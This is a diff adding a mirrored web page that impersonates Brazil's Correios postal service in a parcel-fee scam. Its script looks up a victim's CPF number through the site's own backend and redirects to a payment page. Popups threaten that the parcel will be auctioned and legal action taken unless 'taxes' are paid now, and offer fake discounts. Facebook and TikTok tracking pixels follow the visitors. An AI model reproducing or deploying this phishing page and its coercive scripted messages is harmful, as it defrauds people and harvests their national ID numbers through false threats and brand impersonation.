@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from statuspedido.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Jul 2024 20:31:56 GMT -->
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Correios - Login e Rastreamento</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+   
+        <!-- Meta Pixel Code -->
+        <script>
+            !function (f, b, e, v, n, t, s) {
+                if (f.fbq) return; n = f.fbq = function () {
+                    n.callMethod ?
+                        n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+                };
+                if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+                n.queue = []; t = b.createElement(e); t.async = !0;
+                t.src = v; s = b.getElementsByTagName(e)[0];
+                s.parentNode.insertBefore(t, s)
+            }(window, document, 'script',
+                'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', '857083502539106');
+            fbq('track', 'PageView');
+        </script>
+        <noscript><img height="1" width="1" style="display:none"
+                src="https://www.facebook.com/tr?id=857083502539106&ev=PageView&noscript=1" /></noscript>
+
+     
+            <script>
+                !function (w, d, t) {
+                    w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+                        for (
+                            var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+                    }, ttq.load = function (e, n) {
+                        var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+                            ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+                    };
+
+
+                    ttq.load('CQN7MQ3C77U3Q8QKK3S0');
+                    ttq.page();
+                }(window, document, 'ttq');
+            </script>
+            <!-- TikTok Pixel Code End -->
+        <!-- <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script> -->
+<script>
+    window.pixelId = "66b16fec34a360780bf5a289";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+</script>
+    <style>
+        @keyframes pulse-animation {
+    0% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(1.05);
+    }
+    100% {
+        transform: scale(1);
+    }
+}
+
+.pulse {
+    animation: pulse-animation 2s infinite;
+}
+
+        body {
+            font-family: 'Trebuchet MS', sans-serif;
+        }
+        .header-fixed {
+            position: fixed;
+            top: 30px;
+            width: 100%;
+            z-index: 1000;
+            background-color: white;
+        }
+        .content {
+            margin-top: 40px; /* Altura do cabeçalho */
+            display: flex;
+            flex-direction: column;
+            min-height: calc(35vh - 140px); /* Altura da tela menos a altura do cabeçalho */
+        }
+        .main-content {
+            margin-top: 60px;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 200px; /* Defina a altura fixa desejada */
+            margin-bottom: -100pxpx; /* Espaço até o footer */
+        }
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 35px;
+            background-color: #ffefb2;
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            justify-content: space-between;
+        }
+        .top-bar span {
+            color: #E02424; /* Cor vermelha */
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        .top-bar span:hover {
+            text-decoration: underline;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+        }
+        .popup-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .popup-header {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            color: #00416B;
+        }
+        .popup-message {
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            color: #333;
+        }
+        .popup-button {
+            display: inline-block;
+            margin: 10px;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .popup-button-accept {
+            background-color: #28a745;
+            color: white;
+        }
+        .popup-button-accept:hover {
+            background-color: #218838;
+        }
+        .popup-button-decline {
+            background-color: #dc3545;
+            color: white;
+        }
+        .popup-button-decline:hover {
+            background-color: #c82333;
+        }
+        .popup-button-secondary {
+            background-color: #007bff;
+            color: white;
+        }
+        .popup-button-secondary:hover {
+            background-color: #0056b3;
+        }
+        .loading-message {
+            font-size: 1.2rem;
+            color: #00416B;
+            margin-bottom: 1rem;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'correios-yellow': '#FFE602',
+                        'correios-blue': '#003399',
+                        'correios-navbar': '#F5F3F0',
+                        'correios-button': '#1B73E8',
+                        'correios-text': '#00416B',
+                        'correios-footer-text': '#003157',
+                        'correios-menu-icon': '#0071AD',
+                    },
+                    fontFamily: {
+                        'trebuchet': ['"Trebuchet MS"', 'sans-serif'],
+                    },
+                }
+            }
+        };
+
+        function validarCPF(cpf) {
+            cpf = cpf.replace(/[^\d]+/g, '');
+            if (cpf == '') return false;
+            if (cpf.length != 11 ||
+                cpf == "00000000000" ||
+                cpf == "11111111111" ||
+                cpf == "22222222222" ||
+                cpf == "33333333333" ||
+                cpf == "44444444444" ||
+                cpf == "55555555555" ||
+                cpf == "66666666666" ||
+                cpf == "77777777777" ||
+                cpf == "88888888888" ||
+                cpf == "99999999999")
+                return false;
+            add = 0;
+            for (i = 0; i < 9; i++)
+                add += parseInt(cpf.charAt(i)) * (10 - i);
+            rev = 11 - (add % 11);
+            if (rev == 10 || rev == 11)
+                rev = 0;
+            if (rev != parseInt(cpf.charAt(9)))
+                return false;
+            add = 0;
+            for (i = 0; i < 10; i++)
+                add += parseInt(cpf.charAt(i)) * (11 - i);
+            rev = 11 - (add % 11);
+            if (rev == 10 || rev == 11)
+                rev = 0;
+            if (rev != parseInt(cpf.charAt(10)))
+                return false;
+            return true;
+        }
+
+        function formatarCPF(input) {
+            let cpf = input.value.replace(/\D/g, '');
+            if (cpf.length > 11) {
+                cpf = cpf.slice(0, 11);
+            }
+            if (cpf.length > 9) {
+                cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            } else if (cpf.length > 6) {
+                cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
+            } else if (cpf.length > 3) {
+                cpf = cpf.replace(/(\d{3})(\d{3})/, '$1.$2');
+            }
+            input.value = cpf;
+        }
+
+        function validarFormulario() {
+            const cpfInput = document.getElementById('cpf');
+            let cpf = cpfInput.value.replace(/[^\d]+/g, '');
+
+            if (!validarCPF(cpf)) {
+                alert('CPF inválido. Por favor, insira um CPF válido.');
+                return false;
+            }
+
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('loadingPage').classList.remove('hidden');
+
+            fetch(`${window.location.protocol}//${window.location.host}/rastreio/checkSaleData/?code=${cpf}`, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data)
+                    if (data.error) {
+                        alert(data.error);
+                    } else {
+                        // document.getElementById('loadingPage').classList.add('hidden');
+                        // document.getElementById('pedidosPage').classList.remove('hidden');
+                        document.getElementById('nomeCompleto').textContent = data.nome;
+                        document.getElementById('cpfExibido').textContent = formatCPF(data.cpf);
+                        confirmarIdentidade(cpf)
+
+                        // if (data && data?.endereco && data.endereco.length == 13) {
+                        //     document.querySelector(".nameOf").textContent = "Código:"
+                        //     if (!data.email || data.email.length < 5 || data.email == null || data.email == "Informação Sigilosa") {
+
+                        //         document.querySelector(".emailTexto").style.display = "none"
+                        //     }
+                        //     sessionStorage.setItem('rastreio', data.endereco);
+                        // }
+                        // // console.log(data)
+                        // if (data && data?.nascimento && data?.nascimento.length > 0) {
+                        //     document.getElementById('endereco').textContent = data.nascimento;
+                        //     document.querySelector(".nameOf").textContent = "Nascimento:"
+                        //     document.querySelector(".emailTexto").style.display = "none"
+                        // }
+                        
+                        // if (data && data?.produto && data?.produto.length > 4) {
+                        //     document.querySelector(".Produto").style.display = "block"
+                        //     document.getElementById('Produto').textContent = data.produto;
+                        // }
+
+                        // if (data && data?.sexo && data?.sexo.length > 0) {
+                        //     document.getElementById('Sexo').textContent = data.sexo;
+                        //     document.querySelector(".Sexo").style.display = "block"
+                        // }
+                        
+                        // if (data?.endereco && data?.endereco.length > 0) document.getElementById('endereco').textContent = data.endereco;
+                        // if (data?.email && data?.email.length > 4 && data.email != "Informação Sigilosa") { 
+                        //     document.getElementById('email').textContent = data.email 
+                        //     document.querySelector(".emailTexto").style.display = "block"
+                        // }
+                        // if (data?.telefone && data?.telefone.length > 0) sessionStorage.setItem('telefone', data.telefone)
+                    
+                        // document.getElementById('pedidosTitle').textContent = `${data.nome}, encontramos pedidos retidos em uma de nossas agências.`;
+                        // sessionStorage.setItem('utm', data.by);
+                    }
+                })
+                .catch(error => {
+                    alert( `Erro ao consultar CPF. Por favor, tente novamente. ${error}`);
+                    console.error('Erro ao consultar CPF:', error);
+                });
+
+            return false;
+        }
+
+        function formatCPF(cpf) {
+            // Remove qualquer caractere que não seja número
+            cpf = cpf.replace(/\D/g, '');
+
+            // Adiciona os pontos e o hífen na posição correta
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        function confirmarIdentidade() {
+            const nome = document.getElementById('nomeCompleto').textContent;
+            const cpf = document.getElementById('cpfExibido').textContent;
+            sessionStorage.setItem('cpf', cpf);
+            sessionStorage.setItem('nome', nome);
+
+            setTimeout(() => {
+                console.log(`${window.location.protocol}//${window.location.host}/rastreio/pagarremessa/?code=${cpf}`)
+                window.location.href = `${window.location.protocol}//${window.location.host}/rastreio/pagarremessa/?code=${cpf}`;
+
+            }, 500);
+
+
+            // const nome = document.getElementById('nomeCompleto').textContent;
+            // const cpf = document.getElementById('cpfExibido').textContent;
+
+            // // Salvar nome e CPF no localStorage para usar em outras partes do site
+            // localStorage.setItem('nome', nome);
+            // localStorage.setItem('cpf', cpf);
+
+            // mostrarRastreamento();
+        }
+
+        function mostrarRastreamento() {
+            const cpf = document.getElementById('cpf').value;
+            document.getElementById('pedidosPage').classList.add('hidden');
+            document.getElementById('loadingRastreamentoPage').classList.remove('hidden');
+
+            setTimeout(() => {
+                document.getElementById('loadingRastreamentoPage').classList.add('hidden');
+                document.getElementById('rastreamentoPage').classList.remove('hidden');
+                document.getElementById('cpfRastreamento').textContent = cpf;
+            }, 5000);
+        }
+
+        function showPopup() {
+            const popup = document.getElementById('popup');
+            popup.classList.remove('hidden');
+        }
+
+        function closePopup() {
+            const popup = document.getElementById('popup');
+            popup.classList.add('hidden');
+        }
+
+        function handleDecline(action) {
+            if (action === 'initial') {
+                document.getElementById('popup').innerHTML = `
+                    <div class="popup-content">
+                        <p class="loading-message">Verificando renegociação...</p>
+                        <div class="loader"></div>
+                    </div>
+                `;
+                setTimeout(() => {
+                    document.getElementById('popup').innerHTML = `
+                        <div class="popup-content">
+                            <h2 class="popup-header">Oferta Irresistível!</h2>
+                            <p id="popupMessage" class="popup-message">A taxa vai abaixar 70% se você realizar o pagamento agora. Última chance de receber este pedido.</p>
+                            <div>
+                                <span id="acceptButton" class="popup-button popup-button-accept" onclick="window.location.href='/oferta50/'">Aceitar Oferta</span>
+                                <span id="declineButton" class="popup-button popup-button-decline" onclick="handleDecline('final')">Perder o direito de receber</span>
+                            </div>
+                        </div>
+                    `;
+                }, 3000);
+            } else if (action === 'final') {
+                document.getElementById('popup').innerHTML = `
+                    <div class="popup-content">
+                        <h2 class="popup-header">Última Chance!</h2>
+                        <p id="popupMessage" class="popup-message">O pedido será leiloado e se você não pagar os impostos, sofrerá ações legais.</p>
+                        <div>
+                            <span id="acceptButton" class="popup-button popup-button-accept" onclick="window.location.href='/oferta50/'">Aceitar Oferta</span>
+                            <span id="declineButton" class="popup-button popup-button-decline">Perder o direito de receber</span>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-100 font-trebuchet">
+    <div class="top-bar" style="display: none;">
+        <span onclick="showPopup()">
+            <i class=""></i>
+        </span>
+    </div>
+
+    <div id="popup" class="hidden popup">
+        <div class="popup-content">
+            <h2 class="popup-header">Renegociação Aceita</h2>
+            <p id="popupMessage" class="popup-message">A taxa vai abaixar 50% se você realizar o pagamento agora. Última chance de receber este pedido.</p>
+            <div>
+                <span id="acceptButton" class="popup-button popup-button-accept" onclick="window.location.href='oferta50/index.html'">Aceitar Oferta</span>
+                <span id="declineButton" class="popup-button popup-button-decline" onclick="handleDecline('initial')">Perder o direito de receber</span>
+            </div>
+        </div>
+    </div>
+</body>
+
+
+</html>
